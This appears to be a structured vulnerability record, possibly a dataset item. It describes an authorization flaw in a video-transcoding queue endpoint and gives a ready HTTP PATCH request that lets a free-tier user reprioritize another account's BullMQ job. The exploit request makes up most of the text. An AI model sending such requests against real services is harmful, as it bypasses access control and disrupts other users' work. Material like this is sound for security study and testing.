diagnosis: The video transcoding priority adjustment endpoint changes BullMQ job scheduling priority based directly on client-specified jobId and priority value without checking whether the authenticated user's account owns the media transcode task.
exploit_request:
PATCH /api/queues/video-transcode/jobs/job_vid_49102/priority HTTP/1.1
Host: media-pipeline.stream.tv:8009
Authorization: Bearer <free_tier_user_token>
Content-Type: application/json

{"priority": 1}
